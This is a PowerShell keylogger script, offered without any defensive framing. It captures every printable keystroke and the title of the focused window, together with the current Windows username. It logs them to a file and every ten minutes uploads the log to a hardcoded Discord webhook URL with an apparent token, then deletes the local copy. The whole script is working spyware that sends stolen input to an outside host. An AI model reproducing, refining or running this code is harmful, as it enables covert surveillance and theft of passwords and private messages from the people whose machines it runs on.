# Define the log file and Discord webhook URL
$logFile = "C:\key_log.txt"
$discordWebhookUrl = "https://discord.com/api/webhooks/1281143685895159809/FnbUZFSOnixzoac78xUQuXJ7qve5OoH1jZ8ejA7zDPUbqb1LX-7ltk0adeRzUYq0H0Un"
$keystrokeBuffer = ""
$currentFocusedApp = ""

# Capture the current username
$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Ensure the log file exists or create it, and log the username as the first entry
if (-not (Test-Path $logFile)) {
    New-Item -Path $logFile -ItemType File -Force
}

# Write the username to the log file as the first entry
Add-Content -Path $logFile -Value "User: $username"

# Load Windows API for capturing keystrokes and focused window
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;

    public class FocusHelper {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
    }
"@

# Function to get the currently focused process name or app, with filtering of background processes
function Get-FocusedApp {
    $handle = [FocusHelper]::GetForegroundWindow()
    $windowTitle = New-Object System.Text.StringBuilder 256
    [void] [FocusHelper]::GetWindowText($handle, $windowTitle, $windowTitle.Capacity)

    # List of processes to ignore (common background processes)
    $ignoredProcesses = @(
        "Idle", "System", "svchost", "dwm", "csrss", "conhost", "ctfmon", 
        "winlogon", "sihost", "services", "smss", "fontdrvhost", "audiodg",
        "explorer", "WmiPrvSE", "WUDFHost", "MsMpEng", "RuntimeBroker", 
        "spoolsv", "Registry"
    )

    # If the window title is empty, check the process associated with the window handle
    if ($windowTitle.ToString() -eq "") {
        $focusedProcess = Get-Process | Where-Object { $_.MainWindowHandle -eq $handle }
        if ($focusedProcess) {
            # Ignore known background/system processes
            if ($focusedProcess.Name -notin $ignoredProcesses) {
                return $focusedProcess.Name
            }
        }
    }
    
    # Return the window title if it exists and isn't a background process
    if ($windowTitle.ToString() -ne "" -and $windowTitle.ToString() -notin $ignoredProcesses) {
        return $windowTitle.ToString()
    }

    return $null  # Return null for ignored apps and background processes
}

# Function to write keystrokes to the log file with spaces between each character
function Log-Keystroke {
    param([string]$keyChar)
    # Add a space between each keystroke for readability
    $global:keystrokeBuffer += "$keyChar "
}

# Function to write activity (focused app or keystrokes) to the log file
function Log-Activity {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "$timestamp - $message"
    
    # Write the entry to the log file
    try {
        Add-Content -Path $logFile -Value $entry
    } catch {
        Write-Host "Error writing to log file: $_"
    }
}

# Function to send the log file to Discord as an attachment
function Send-LogToDiscord {
    try {
        # Prepare the log file as a file attachment
        $boundary = [System.Guid]::NewGuid().ToString()
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=`"$boundary`""
        }

        $fileContent = [IO.File]::ReadAllBytes($logFile)
        $fileBase64 = [Convert]::ToBase64String($fileContent)
        
        $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="key_log.txt"
Content-Type: text/plain

$(Get-Content -Path $logFile -Raw)
--$boundary--
"@

        # Send the file to Discord
        Invoke-RestMethod -Uri $discordWebhookUrl -Method Post -Headers $headers -Body $body
    } catch {
        Write-Host "Error sending log file to Discord: $_"
    }
}

# Function to delete the old log file after sending it
function Delete-LogFile {
    try {
        Remove-Item -Path $logFile
        # Recreate the log file after deletion
        New-Item -Path $logFile -ItemType File -Force
    } catch {
        Write-Host "Error deleting log file: $_"
    }
}

# Function to capture and log the currently focused window and associated keystrokes
function Log-FocusedApp {
    $focusedApp = Get-FocusedApp
    
    # Check if the focused window has changed
    if ($global:currentFocusedApp -ne $focusedApp -and $focusedApp -ne $null) {
        # Log the previous app's keystrokes if any exist
        if ($keystrokeBuffer -ne "") {
            Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
            $global:keystrokeBuffer = ""
        }

        # Update the current focused app and log the new focused app
        $global:currentFocusedApp = $focusedApp
        Log-Activity "[FOCUSED APP]: $focusedApp"
    }
}

# Main loop to capture keystrokes and log them
$startTime = Get-Date

while ($true) {
    Log-FocusedApp

    # Capture key presses and filter out non-printable characters
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [FocusHelper]::GetAsyncKeyState($i)

        # Only capture keydown events (ignore key releases) and log printable characters
        if ($keyState -band 0x8000) {
            $keyChar = [char]$i

            # Only log visible ASCII characters (printable characters) between 32 (space) and 126
            if ($i -ge 32 -and $i -le 126) {
                Log-Keystroke $keyChar
            }
        }
    }

    # Delay to avoid rapid capturing of key presses
    Start-Sleep -Milliseconds 90  # Adjust the delay if needed to reduce duplicate characters

    # Send logs every minute
    $elapsedTime = (Get-Date) - $startTime
    if ($elapsedTime.TotalMinutes -ge 10) {
        if ($keystrokeBuffer -ne "") {
            Log-Activity "[KEYSTROKES]: $keystrokeBuffer"
            $keystrokeBuffer = ""
        }

        Send-LogToDiscord
        Delete-LogFile
        $startTime = Get-Date
    }
}
